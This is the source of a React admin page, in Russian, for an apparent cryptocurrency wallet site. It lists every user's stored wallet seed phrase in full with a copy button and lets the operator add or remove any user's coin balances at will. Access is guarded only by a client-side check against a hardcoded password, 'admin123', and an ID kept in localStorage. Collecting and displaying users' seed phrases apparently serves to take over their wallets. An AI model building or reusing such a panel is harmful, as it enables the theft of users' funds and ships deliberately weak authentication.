import { useState, useEffect } from 'react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog';
import Icon from '@/components/ui/icon';
import { useToast } from '@/hooks/use-toast';
import { useNavigate } from 'react-router-dom';
import { api, User } from '@/lib/api';

const ADMIN_PASSWORD = 'admin123';
const ADMIN_USER_ID = 'ae25420cd4106d43';

export default function Admin() {
  const { toast } = useToast();
  const navigate = useNavigate();
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [users, setUsers] = useState<User[]>([]);
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [showAdjustDialog, setShowAdjustDialog] = useState(false);
  const [adjustType, setAdjustType] = useState<'add' | 'remove'>('add');
  const [selectedCrypto, setSelectedCrypto] = useState('BTC');
  const [adjustAmount, setAdjustAmount] = useState('');

  const cryptoOptions = [
    { symbol: 'BTC', name: 'Bitcoin', icon: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png' },
    { symbol: 'ETH', name: 'Ethereum', icon: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' },
    { symbol: 'BNB', name: 'Binance Coin', icon: 'https://cryptologos.cc/logos/bnb-bnb-logo.png' },
    { symbol: 'USDT', name: 'Tether (ETH)', icon: 'https://cryptologos.cc/logos/tether-usdt-logo.png', network: 'ETH' },
    { symbol: 'USDT', name: 'Tether (TRX)', icon: 'https://cryptologos.cc/logos/tether-usdt-logo.png', network: 'TRX' },
    { symbol: 'USDT', name: 'Tether (BSC)', icon: 'https://cryptologos.cc/logos/tether-usdt-logo.png', network: 'BSC' },
    { symbol: 'USDC', name: 'USD Coin (ETH)', icon: 'https://cryptologos.cc/logos/usd-coin-usdc-logo.png', network: 'ETH' },
  ];

  useEffect(() => {
    if (isAuthenticated) {
      loadUsers();
    }
  }, [isAuthenticated]);

  const loadUsers = async () => {
    try {
      const allUsers = await api.users.getAll();
      setUsers(allUsers.map(u => ({
        userId: u.user_id,
        seedPhrase: u.seed_phrase,
        createdAt: new Date(u.created_at).toLocaleString('ru-RU'),
        lastLogin: new Date(u.last_login).toLocaleString('ru-RU')
      })));
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Ошибка загрузки",
        description: "Не удалось загрузить список пользователей",
      });
    }
  };

  const handleLogin = () => {
    const currentUserId = localStorage.getItem('userId');
    
    if (currentUserId !== ADMIN_USER_ID) {
      toast({
        variant: "destructive",
        title: "Доступ запрещен",
        description: "У вас нет прав администратора",
      });
      return;
    }
    
    if (password === ADMIN_PASSWORD) {
      setIsAuthenticated(true);
      toast({
        title: "Вход выполнен",
        description: "Добро пожаловать в админ-панель",
      });
    } else {
      toast({
        variant: "destructive",
        title: "Ошибка входа",
        description: "Неверный пароль",
      });
    }
  };

  const handleAdjustBalance = async () => {
    if (!selectedUser || !adjustAmount) return;

    const amount = parseFloat(adjustAmount);
    if (isNaN(amount) || amount <= 0) {
      toast({
        variant: "destructive",
        title: "Ошибка",
        description: "Введите корректную сумму",
      });
      return;
    }

    try {
      const selectedOption = cryptoOptions.find(c => c.symbol === selectedCrypto);
      const network = selectedOption?.network || null;
      
      const balances = await api.balances.get(selectedUser.userId);
      const balanceKey = `${selectedCrypto}-${network || 'native'}`;
      const currentBalance = balances[balanceKey] || 0;

      let newBalance: number;
      if (adjustType === 'add') {
        newBalance = currentBalance + amount;
      } else {
        if (currentBalance < amount) {
          toast({
            variant: "destructive",
            title: "Ошибка",
            description: "Недостаточно средств для списания",
          });
          return;
        }
        newBalance = currentBalance - amount;
      }

      await api.balances.update(selectedUser.userId, selectedCrypto, network, newBalance);

      toast({
        title: adjustType === 'add' ? "Пополнение выполнено" : "Списание выполнено",
        description: `${adjustType === 'add' ? 'Добавлено' : 'Списано'} ${amount} ${selectedCrypto} для пользователя ${selectedUser.userId}`,
      });

      window.dispatchEvent(new CustomEvent('balanceUpdate'));

      setShowAdjustDialog(false);
      setAdjustAmount('');
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Ошибка",
        description: "Не удалось обновить баланс",
      });
    }
  };

  const handleDeleteUser = async (userId: string) => {
    if (window.confirm(`Вы уверены, что хотите удалить пользователя ${userId}?`)) {
      toast({
        title: "Функция недоступна",
        description: "Удаление пользователей доступно только через интерфейс управления БД",
      });
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Скопировано!",
      description: "Текст скопирован в буфер обмена",
    });
  };

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-background flex items-center justify-center p-4">
        <Card className="w-full max-w-md p-8">
          <div className="text-center mb-6">
            <div className="w-16 h-16 rounded-xl bg-primary/20 flex items-center justify-center mx-auto mb-4">
              <Icon name="Shield" className="text-primary" size={32} />
            </div>
            <h1 className="text-2xl font-bold mb-2">Админ-панель</h1>
            <p className="text-muted-foreground">Введите пароль для доступа</p>
          </div>
          <div className="space-y-4">
            <div>
              <Label>Пароль</Label>
              <Input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onKeyPress={(e) => e.key === 'Enter' && handleLogin()}
                placeholder="••••••••"
              />
            </div>
            <Button onClick={handleLogin} className="w-full gap-2">
              <Icon name="LogIn" size={18} />
              Войти
            </Button>
            <Button onClick={() => navigate('/')} variant="outline" className="w-full gap-2">
              <Icon name="ArrowLeft" size={18} />
              Вернуться на главную
            </Button>
          </div>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background p-4 md:p-6">
      <div className="max-w-7xl mx-auto">
        <header className="mb-8 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-primary/20 flex items-center justify-center">
              <Icon name="Shield" className="text-primary" size={24} />
            </div>
            <div>
              <h1 className="text-2xl font-bold">Админ-панель</h1>
              <p className="text-xs text-muted-foreground">Управление пользователями</p>
            </div>
          </div>
          <div className="flex gap-2">
            <Button variant="outline" size="icon" onClick={loadUsers} className="hover-scale">
              <Icon name="RefreshCw" size={20} />
            </Button>
            <Button
              variant="outline"
              size="icon"
              className="hover-scale text-destructive hover:text-destructive"
              onClick={() => {
                setIsAuthenticated(false);
                setPassword('');
              }}
            >
              <Icon name="LogOut" size={20} />
            </Button>
          </div>
        </header>

        <Card className="p-6 mb-6">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="p-4 bg-primary/10 rounded-lg border border-primary/20">
              <div className="flex items-center gap-3">
                <Icon name="Users" className="text-primary" size={24} />
                <div>
                  <p className="text-sm text-muted-foreground">Всего пользователей</p>
                  <p className="text-2xl font-bold">{users.length}</p>
                </div>
              </div>
            </div>
            <div className="p-4 bg-success/10 rounded-lg border border-success/20">
              <div className="flex items-center gap-3">
                <Icon name="UserCheck" className="text-success" size={24} />
                <div>
                  <p className="text-sm text-muted-foreground">Активных</p>
                  <p className="text-2xl font-bold">{users.length}</p>
                </div>
              </div>
            </div>
            <div className="p-4 bg-secondary/10 rounded-lg border border-secondary/20">
              <div className="flex items-center gap-3">
                <Icon name="Wallet" className="text-secondary" size={24} />
                <div>
                  <p className="text-sm text-muted-foreground">Кошельков создано</p>
                  <p className="text-2xl font-bold">{users.length}</p>
                </div>
              </div>
            </div>
          </div>
        </Card>

        <div className="space-y-4">
          {users.length === 0 ? (
            <Card className="p-12 text-center">
              <div className="flex flex-col items-center gap-4">
                <div className="w-16 h-16 rounded-full bg-muted/50 flex items-center justify-center">
                  <Icon name="Users" size={32} className="text-muted-foreground" />
                </div>
                <div>
                  <h3 className="font-semibold text-lg mb-2">Пользователи не найдены</h3>
                  <p className="text-muted-foreground text-sm">
                    Создайте первый кошелек на сайте
                  </p>
                </div>
              </div>
            </Card>
          ) : (
            users.map((user) => (
              <Card key={user.userId} className="p-6">
                <div className="flex items-start justify-between mb-4">
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 rounded-full bg-primary/20 flex items-center justify-center">
                      <Icon name="User" className="text-primary" size={24} />
                    </div>
                    <div>
                      <h3 className="font-semibold text-lg">Пользователь</h3>
                      <p className="text-sm text-muted-foreground font-mono">ID: {user.userId}</p>
                    </div>
                  </div>
                  <div className="flex gap-2">
                    <Dialog
                      open={showAdjustDialog && selectedUser?.userId === user.userId}
                      onOpenChange={(open) => {
                        setShowAdjustDialog(open);
                        if (open) setSelectedUser(user);
                      }}
                    >
                      <DialogTrigger asChild>
                        <Button variant="outline" size="sm" className="gap-2">
                          <Icon name="Wallet" size={16} />
                          Баланс
                        </Button>
                      </DialogTrigger>
                      <DialogContent className="bg-card">
                        <DialogHeader>
                          <DialogTitle>Управление балансом</DialogTitle>
                        </DialogHeader>
                        <div className="space-y-4 mt-4">
                          <div>
                            <Label>Пользователь</Label>
                            <div className="p-3 bg-muted rounded-lg font-mono text-sm">
                              {user.userId}
                            </div>
                          </div>
                          <div>
                            <Label>Действие</Label>
                            <Select value={adjustType} onValueChange={(value: 'add' | 'remove') => setAdjustType(value)}>
                              <SelectTrigger>
                                <SelectValue />
                              </SelectTrigger>
                              <SelectContent>
                                <SelectItem value="add">
                                  <div className="flex items-center gap-2">
                                    <Icon name="Plus" size={16} />
                                    Пополнить
                                  </div>
                                </SelectItem>
                                <SelectItem value="remove">
                                  <div className="flex items-center gap-2">
                                    <Icon name="Minus" size={16} />
                                    Списать
                                  </div>
                                </SelectItem>
                              </SelectContent>
                            </Select>
                          </div>
                          <div>
                            <Label>Криптовалюта</Label>
                            <Select value={selectedCrypto} onValueChange={setSelectedCrypto}>
                              <SelectTrigger>
                                <SelectValue />
                              </SelectTrigger>
                              <SelectContent>
                                {cryptoOptions.map((crypto, index) => (
                                  <SelectItem key={`${crypto.symbol}-${crypto.network || 'native'}-${index}`} value={crypto.symbol}>
                                    <div className="flex items-center gap-2">
                                      <img src={crypto.icon} alt={crypto.symbol} className="w-4 h-4 object-contain" />
                                      {crypto.name}
                                    </div>
                                  </SelectItem>
                                ))}
                              </SelectContent>
                            </Select>
                          </div>
                          <div>
                            <Label>Сумма</Label>
                            <Input
                              type="number"
                              placeholder="0.00"
                              value={adjustAmount}
                              onChange={(e) => setAdjustAmount(e.target.value)}
                            />
                          </div>
                          <Button onClick={handleAdjustBalance} className="w-full gap-2">
                            <Icon name={adjustType === 'add' ? 'Plus' : 'Minus'} size={18} />
                            {adjustType === 'add' ? 'Пополнить' : 'Списать'}
                          </Button>
                        </div>
                      </DialogContent>
                    </Dialog>
                    <Button
                      variant="outline"
                      size="sm"
                      className="gap-2 text-destructive hover:text-destructive"
                      onClick={() => handleDeleteUser(user.userId)}
                    >
                      <Icon name="Trash2" size={16} />
                      Удалить
                    </Button>
                  </div>
                </div>

                <div className="space-y-3">
                  <div className="p-4 bg-muted/50 rounded-lg">
                    <div className="flex items-center justify-between mb-2">
                      <Label className="text-sm">Seed-фраза</Label>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyToClipboard(user.seedPhrase)}
                        className="h-8 gap-2"
                      >
                        <Icon name="Copy" size={14} />
                        Копировать
                      </Button>
                    </div>
                    <p className="font-mono text-sm break-all">{user.seedPhrase}</p>
                  </div>

                  <div className="grid md:grid-cols-2 gap-3">
                    <div className="p-3 bg-muted/50 rounded-lg">
                      <p className="text-xs text-muted-foreground mb-1">Дата создания</p>
                      <p className="font-mono text-sm">{user.createdAt}</p>
                    </div>
                    <div className="p-3 bg-muted/50 rounded-lg">
                      <p className="text-xs text-muted-foreground mb-1">Последний вход</p>
                      <p className="font-mono text-sm">{user.lastLogin}</p>
                    </div>
                  </div>
                </div>
              </Card>
            ))
          )}
        </div>
      </div>
    </div>
  );
}